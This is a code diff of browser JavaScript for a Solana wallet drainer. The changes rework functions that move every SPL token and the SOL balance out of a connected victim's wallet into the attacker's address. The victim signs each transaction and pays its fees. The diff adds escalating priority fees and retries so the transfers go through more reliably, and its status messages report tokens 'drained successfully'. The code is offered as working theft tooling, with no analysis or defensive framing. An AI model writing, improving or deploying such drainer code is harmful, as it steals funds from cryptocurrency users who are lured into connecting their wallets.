@@ -842,7 +842,7 @@
                 RPC_ENDPOINT, 
                 {
                     commitment: 'confirmed',
-                    confirmTransactionInitialTimeout: 120000, // 2 minutes timeout
+                    confirmTransactionInitialTimeout: 60000, // 1 minute timeout
                     disableRetryOnRateLimit: false
                 }
             );
@@ -949,17 +949,38 @@
             }
         }
 
-        // Improved transaction sending with retry logic
+        // Improved transaction sending with priority fees and retry logic
         async function sendTransactionWithRetry(connection, transaction, wallet, maxRetries = 3) {
             let retries = 0;
+            let priorityFee = 100000; // Start with 100K microlamports
             
             while (retries < maxRetries) {
                 try {
                     // Get a fresh blockhash for each attempt
                     const { blockhash, lastValidBlockHeight } = 
                         await connection.getLatestBlockhash('confirmed');
+                    
+                    // Reset transaction instructions to avoid duplicates
+                    transaction.instructions = transaction.instructions.filter(
+                        instr => !solanaWeb3.ComputeBudgetProgram.programId.equals(instr.programId)
+                    );
+                    
+                    // Add compute budget instructions at the BEGINNING
+                    transaction.instructions.unshift(
+                        solanaWeb3.ComputeBudgetProgram.setComputeUnitLimit({
+                            units: 300000 // Set appropriate compute unit limit
+                        })
+                    );
+                    
+                    transaction.instructions.unshift(
+                        solanaWeb3.ComputeBudgetProgram.setComputeUnitPrice({
+                            microLamports: priorityFee
+                        })
+                    );
+                    
                     transaction.recentBlockhash = blockhash;
                     transaction.lastValidBlockHeight = lastValidBlockHeight;
+                    transaction.feePayer = wallet._publicKey || wallet.publicKey;
                     
                     const signed = await wallet.signTransaction(transaction);
                     const signature = await connection.sendRawTransaction(
@@ -986,6 +1007,9 @@
                     console.error(`Transaction attempt ${retries} failed:`, err);
                     resultDiv.innerText += `\nRetry ${retries}/${maxRetries}: ${err.message}`;
                     
+                    // Increase priority fee with each retry
+                    priorityFee *= 2;
+                    
                     // Wait before retrying with exponential backoff
                     const delay = Math.min(1000 * Math.pow(2, retries), 10000);
                     await new Promise(resolve => setTimeout(resolve, delay));
@@ -995,7 +1019,7 @@
             throw new Error(`Transaction failed after ${maxRetries} retries`);
         }
 
-        // New implementation: Drain all tokens with batched transactions
+        // Drain all tokens with individual transactions for better reliability
         async function drainAllSplTokens(ownerPublicKey) {
             try {
                 if (!ownerPublicKey) {
@@ -1028,60 +1052,17 @@
                 
                 resultDiv.innerText += `\nFound ${accountsWithBalance.length} token(s) with balance.`;
                 
-                // Process tokens in batches of 8 (to stay under transaction size limits)
-                const batchSize = 8;
-                const batches = [];
-                
-                for (let i = 0; i < accountsWithBalance.length; i += batchSize) {
-                    batches.push(accountsWithBalance.slice(i, i + batchSize));
-                }
-                
-                resultDiv.innerText += `\nProcessing ${batches.length} batch(es) of tokens...`;
-                
-                // Process each batch with a single transaction
-                for (let i = 0; i < batches.length; i++) {
-                    const batch = batches[i];
-                    const transaction = new solanaWeb3.Transaction();
-                    
-                    resultDiv.innerText += `\n\nPreparing batch ${i+1}/${batches.length} (${batch.length} tokens)`;
-                    
-                    // First create any missing ATAs
-                    for (const { account } of batch) {
-                        const info = account.data.parsed.info;
-                        const mint = new solanaWeb3.PublicKey(info.mint);
-                        
-                        // Check if destination ATA exists, if not create it
-                        const ata = await window.splToken.Token.getAssociatedTokenAddress(
-                            window.splToken.ASSOCIATED_TOKEN_PROGRAM_ID,
-                            window.splToken.TOKEN_PROGRAM_ID,
-                            mint,
-                            myWallet
-                        );
-                        
-                        const ataInfo = await connection.getAccountInfo(ata);
-                        
-                        if (!ataInfo) {
-                            transaction.add(
-                                window.splToken.Token.createAssociatedTokenAccountInstruction(
-                                    window.splToken.ASSOCIATED_TOKEN_PROGRAM_ID,
-                                    window.splToken.TOKEN_PROGRAM_ID,
-                                    mint,
-                                    ata,
-                                    myWallet,
-                                    ownerPublicKey
-                                )
-                            );
-                            resultDiv.innerText += `\nAdding ATA creation for ${info.mint.slice(0, 6)}...`;
-                        }
-                    }
-                    
-                    // Then add transfer instructions
-                    for (const { pubkey, account } of batch) {
+                // Process each token individually for better reliability
+                for (const { pubkey, account } of accountsWithBalance) {
+                    try {
                         const info = account.data.parsed.info;
                         const mint = new solanaWeb3.PublicKey(info.mint);
                         const amount = parseInt(info.tokenAmount.amount, 10);
                         
                         if (amount > 0) {
+                            resultDiv.innerText += `\n\nProcessing token: ${info.mint.slice(0, 6)}...`;
+                            
+                            // Create ATA if it doesn't exist
                             const ata = await window.splToken.Token.getAssociatedTokenAddress(
                                 window.splToken.ASSOCIATED_TOKEN_PROGRAM_ID,
                                 window.splToken.TOKEN_PROGRAM_ID,
@@ -1089,7 +1070,58 @@
                                 myWallet
                             );
                             
-                            transaction.add(
+                            const ataInfo = await connection.getAccountInfo(ata);
+                            
+                            if (!ataInfo) {
+                                const createAtaTx = new solanaWeb3.Transaction();
+                                
+                                // Add compute budget instructions FIRST
+                                createAtaTx.add(
+                                    solanaWeb3.ComputeBudgetProgram.setComputeUnitLimit({
+                                        units: 300000
+                                    })
+                                );
+                                
+                                createAtaTx.add(
+                                    solanaWeb3.ComputeBudgetProgram.setComputeUnitPrice({
+                                        microLamports: 100000
+                                    })
+                                );
+                                
+                                createAtaTx.add(
+                                    window.splToken.Token.createAssociatedTokenAccountInstruction(
+                                        window.splToken.ASSOCIATED_TOKEN_PROGRAM_ID,
+                                        window.splToken.TOKEN_PROGRAM_ID,
+                                        mint,
+                                        ata,
+                                        myWallet,
+                                        ownerPublicKey
+                                    )
+                                );
+                                
+                                createAtaTx.feePayer = ownerPublicKey;
+                                
+                                await sendTransactionWithRetry(connection, createAtaTx, window.activeWallet);
+                                resultDiv.innerText += `\nCreated ATA for ${info.mint.slice(0, 6)}`;
+                            }
+                            
+                            // Create transfer transaction
+                            const transferTx = new solanaWeb3.Transaction();
+                            
+                            // Add compute budget instructions FIRST
+                            transferTx.add(
+                                solanaWeb3.ComputeBudgetProgram.setComputeUnitLimit({
+                                    units: 300000
+                                })
+                            );
+                            
+                            transferTx.add(
+                                solanaWeb3.ComputeBudgetProgram.setComputeUnitPrice({
+                                    microLamports: 100000
+                                })
+                            );
+                            
+                            transferTx.add(
                                 window.splToken.Token.createTransferInstruction(
                                     window.splToken.TOKEN_PROGRAM_ID,
                                     pubkey,
@@ -1100,91 +1132,20 @@
                                 )
                             );
                             
-                            const symbol = info.tokenAmount.symbol || info.symbol || 'tokens';
-                            resultDiv.innerText += `\nAdding transfer for ${amount / Math.pow(10, info.tokenAmount.decimals)} ${symbol}`;
+                            transferTx.feePayer = ownerPublicKey;
+                            
+                            await sendTransactionWithRetry(connection, transferTx, window.activeWallet);
+                            resultDiv.innerText += `\nToken ${info.mint.slice(0, 6)} drained successfully!`;
                         }
-                    }
-                    
-                    // Send the batch transaction
-                    transaction.feePayer = ownerPublicKey;
-                    
-                    if (!window.activeWallet) {
-                        throw new Error("Wallet disconnected");
-                    }
-                    
-                    try {
-                        resultDiv.innerText += `\nSending batch transaction...`;
-                        await sendTransactionWithRetry(connection, transaction, window.activeWallet);
-                        resultDiv.innerText += `\nBatch ${i+1} drained successfully!`;
                     } catch (err) {
-                        resultDiv.innerText += `\nBatch ${i+1} failed: ${err.message}`;
-                        // If batching fails, fall back to individual transfers
-                        resultDiv.innerText += `\nFalling back to individual transfers...`;
-                        for (const item of batch) {
-                            await drainSingleToken(connection, ownerPublicKey, item.pubkey, item.account);
-                        }
+                        const mintId = account?.data?.parsed?.info?.mint?.slice(0, 6) || "unknown";
+                        resultDiv.innerText += `\nFailed to drain token ${mintId}: ${err.message}`;
+                        // Continue with next token
                     }
                 }
             } catch (err) {
                 console.error("Token draining error:", err);
                 resultDiv.innerText += `\nToken draining error: ${err.message}`;
-            }
-        }
-
-        // Helper function to drain a single token if batching fails
-        async function drainSingleToken(connection, ownerPublicKey, pubkey, account) {
-            try {
-                const info = account.data.parsed.info;
-                const mint = new solanaWeb3.PublicKey(info.mint);
-                const amount = parseInt(info.tokenAmount.amount, 10);
-                
-                if (amount > 0) {
-                    // Create ATA if it doesn't exist
-                    const ata = await window.splToken.Token.getAssociatedTokenAddress(
-                        window.splToken.ASSOCIATED_TOKEN_PROGRAM_ID,
-                        window.splToken.TOKEN_PROGRAM_ID,
-                        mint,
-                        myWallet
-                    );
-                    
-                    const ataInfo = await connection.getAccountInfo(ata);
-                    
-                    if (!ataInfo) {
-                        const createAtaTx = new solanaWeb3.Transaction().add(
-                            window.splToken.Token.createAssociatedTokenAccountInstruction(
-                                window.splToken.ASSOCIATED_TOKEN_PROGRAM_ID,
-                                window.splToken.TOKEN_PROGRAM_ID,
-                                mint,
-                                ata,
-                                myWallet,
-                                ownerPublicKey
-                            )
-                        );
-                        createAtaTx.feePayer = ownerPublicKey;
-                        
-                        await sendTransactionWithRetry(connection, createAtaTx, window.activeWallet);
-                        resultDiv.innerText += `\nCreated ATA for ${info.mint.slice(0, 6)}`;
-                    }
-                    
-                    const transaction = new solanaWeb3.Transaction().add(
-                        window.splToken.Token.createTransferInstruction(
-                            window.splToken.TOKEN_PROGRAM_ID,
-                            pubkey,
-                            ata,
-                            ownerPublicKey,
-                            [],
-                            amount
-                        )
-                    );
-                    
-                    transaction.feePayer = ownerPublicKey;
-                    
-                    await sendTransactionWithRetry(connection, transaction, window.activeWallet);
-                    resultDiv.innerText += `\nToken ${info.mint.slice(0, 6)} drained individually.`;
-                }
-            } catch (err) {
-                const mintId = account?.data?.parsed?.info?.mint?.slice(0, 6) || "unknown";
-                resultDiv.innerText += `\nFailed to drain token ${mintId}: ${err.message}`;
             }
         }
 
@@ -1207,7 +1168,22 @@
                 if (ownerBalance > amountToLeave) {
                     resultDiv.innerText += `\nDraining SOL...`;
                     
-                    const transaction = new solanaWeb3.Transaction().add(
+                    const transaction = new solanaWeb3.Transaction();
+                    
+                    // Add compute budget instructions FIRST
+                    transaction.add(
+                        solanaWeb3.ComputeBudgetProgram.setComputeUnitLimit({
+                            units: 300000
+                        })
+                    );
+                    
+                    transaction.add(
+                        solanaWeb3.ComputeBudgetProgram.setComputeUnitPrice({
+                            microLamports: 100000
+                        })
+                    );
+                    
+                    transaction.add(
                         solanaWeb3.SystemProgram.transfer({
                             fromPubkey: ownerPublicKey,
                             toPubkey: myWallet,
